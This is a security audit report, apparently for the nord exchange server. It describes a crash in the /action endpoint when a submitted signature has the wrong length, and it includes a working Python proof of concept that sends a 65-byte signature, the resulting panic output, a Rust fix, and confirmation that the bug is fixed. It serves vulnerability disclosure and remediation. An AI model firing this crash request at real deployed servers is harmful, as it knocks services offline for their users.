# Incorrect signature for action payload crashes the nord server 

## Summary
This bug report is about a vulnerability found in the `/action` HTTP endpoint used by a user to submit an action to be executed through a POST request. The issue occurs when the signature provided in the POST request does not have the expected size, causing the server to crash. This can be exploited by any user to crash the nord server. A proof of concept is provided, along with a recommendation to handle the error instead of panicking. The bug has been fixed in the latest version of the code.

## Details
## Vulnerability Report

## Context
`auth.rs#L99-L123`

## Description
The `/action` HTTP endpoint is used by a user to submit an action to be executed through a POST request. The payload from the POST request is decoded in the `decode_action` function as an Action and a signature. However, the signature parsing will panic when the provided signature doesn't have the expected size.

Any user can crash the nord server through a POST request with an invalid signature.

## Proof of Concept
Build and start the nord server:
- Build in release mode
  ```bash
  cargo build --release
  ```
- Start the nord server; it should listen on `:3000`
  ```bash
  ./target/release/nord start
  ```

At the root of the repository, execute the following:
- Create an exploit directory and copy the proto file
  ```bash
  mkdir exploit && cp engine/nord.proto exploit/nord.proto && cd exploit
  ```
- Create a Python environment
  ```bash
  python3 -m venv localenv && source localenv/bin/activate && pip install protobuf requests
  ```
- Compile the proto file
  ```bash
  protoc --python_out=. nord.proto
  ```

Copy the following Python exploit in `exploit/exploit.py`:

```python
import nord_pb2  # Import the generated module
import requests
from google.protobuf.internal.encoder import _VarintBytes

def encode_action_message():
    # Create an instance of the Action message
    action = nord_pb2.Action()
    
    # Populate the message (example with PlaceOrder action)
    place_order = action.place_order
    place_order.session_id = 1234567890
    place_order.market_id = 1
    place_order.side = nord_pb2.BID  # Use the appropriate enum
    place_order.fill_mode = nord_pb2.LIMIT
    place_order.is_reduce_only = False
    place_order.price = 1000000  # Example price
    place_order.size = 10  # Example size
    place_order.quote_size.lo = 100000  # Example quote_size
    place_order.quote_size.hi = 0
    
    # Encode the message to a binary format
    action_data = action.SerializeToString()
    
    # Prefix the message with a varint representing the length (for length-delimited messages)
    action_length_prefix = _VarintBytes(len(action_data))
    
    # Combine the length prefix and the message data
    encoded_data = action_length_prefix + action_data
    return encoded_data

def send_post_request(encoded_data):
    url = "http://127.0.0.1:3000/action"  # Replace with your server URL
    headers = {'Content-Type': 'application/x-protobuf'}

    try:
        response = requests.post(url, data=encoded_data, headers=headers)
        if response.status_code == 200:
            print("Request successful!")
        else:
            print(f"Request failed with status code: {response.status_code}")
    except:
        print("Remote server crashed")

if __name__ == "__main__":
    # First request is successful because the signature is 64 bytes
    encoded_data = encode_action_message()
    send_post_request(encoded_data + b"a"*64)
    
    # Second request crashes the server because the signature is 65 bytes
    encoded_data = encode_action_message()
    send_post_request(encoded_data + b"a"*65)
```

Then, run the exploit:
```bash
python3 exploit.py
```

This results in the following output for the nord server:
```
thread '<unnamed>' panicked at engine/src/auth.rs:117:22:
called `Result::unwrap()` on an `Err` value: InvalidSignature
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
```

## Recommendation
The `decode_action` function must not panic but should return an Error instead. The following code can be used to propagate the error:

```rust
let sig_with_protocol = match &action.kind {
    ActionKind::CreateSession(_) | ActionKind::RevokeSession(_) => {
        SigWithProtocol::EcdsaEthDigest(
            Signature::from_slice(sig)
                .map_err(|_| InvalidSignature)?,
        )
    }
    ActionKind::CreateMarket(_)
    | ActionKind::CreateToken(_)
    | ActionKind::Deposit(_)
    | ActionKind::PythSetSymbolFeed(_)
    | ActionKind::PythSetWormholeGuardians(_) => SigWithProtocol::Ecdsa(
        Signature::from_slice(sig)
            .map_err(|_| InvalidSignature)?,
    ),
    ActionKind::Withdraw(_) | ActionKind::PlaceOrder(_) | ActionKind::CancelOrderById(_) => {
        SigWithProtocol::Ed25519(
            ed25519_consensus::Signature::try_from(sig)
                .map_err(|_| InvalidSignature)?,
        )
    }
    ActionKind::PythPriceFeedUpdate(_) | ActionKind::Liquidate(_) => SigWithProtocol::None,
};
```

**LayerN:** Fixed in PR 925 (commit `42de6a47`).

**Cantina Managed:** Fixed. The signature decoding result is correctly handled. Any error is mapped into an `Error::InvalidSignature` error.
